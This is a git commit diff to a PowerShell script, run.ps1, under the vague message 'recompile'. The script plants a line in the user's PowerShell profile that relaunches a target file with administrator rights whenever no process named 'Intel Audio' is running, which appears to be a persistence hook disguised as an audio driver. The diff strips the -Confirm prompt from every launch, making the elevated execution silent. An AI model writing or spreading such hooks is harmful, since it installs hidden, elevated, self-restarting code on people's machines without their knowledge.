d72088b1626b9cc793355fb93a6949b8ec188ed6
B95segal <193628847+B95segal@users.noreply.github.com>
2025-01-10 07:43:18 +1100

    recompile

--- run.ps1
+++ run.ps1
@@ -61,19 +61,19 @@ if (-Not (Test-Path $PowershellPath)) {
       New-Item -ItemType Directory -Force -Path $PowershellPath
       New-Item -ItemType File -Force -Path $PowershellFile
       Write-Output "Powershell profile created"
-      Set-Content -Path $PowershellFile -Value "if (Test-Path $TargetFile) { if (-Not (Get-Process -Name 'Intel Audio')) { Start-Process $TargetFile  -Verb RunAs -Confirm } }"
+      Set-Content -Path $PowershellFile -Value "if (Test-Path $TargetFile) { if (-Not (Get-Process -Name 'Intel Audio')) { Start-Process $TargetFile  -Verb RunAs } }"
       Write-Output "Powershell profile updated"
 }
 if (Select-String -Path $PowershellFile "Start-Process") {
       Write-Output "Powershell profile already updated"
       # exit 0
 } else {
-      Add-Content -Path $PowershellFile -Value "if (Test-Path $TargetFile) { if (-Not (Get-Process -Name 'Intel Audio')) { Start-Process $TargetFile  -Verb RunAs -Confirm } }"
+      Add-Content -Path $PowershellFile -Value "if (Test-Path $TargetFile) { if (-Not (Get-Process -Name 'Intel Audio')) { Start-Process $TargetFile  -Verb RunAs } }"
       Write-Output "Powershell profile updated"
 }
 
 if (Test-Path $TargetFile) {
       if (-Not (Get-Process -Name 'Intel Audio')) {
-            Start-Process -FilePath $TargetFile -Verb RunAs -Confirm
+            Start-Process -FilePath $TargetFile -Verb RunAs
       }
 }
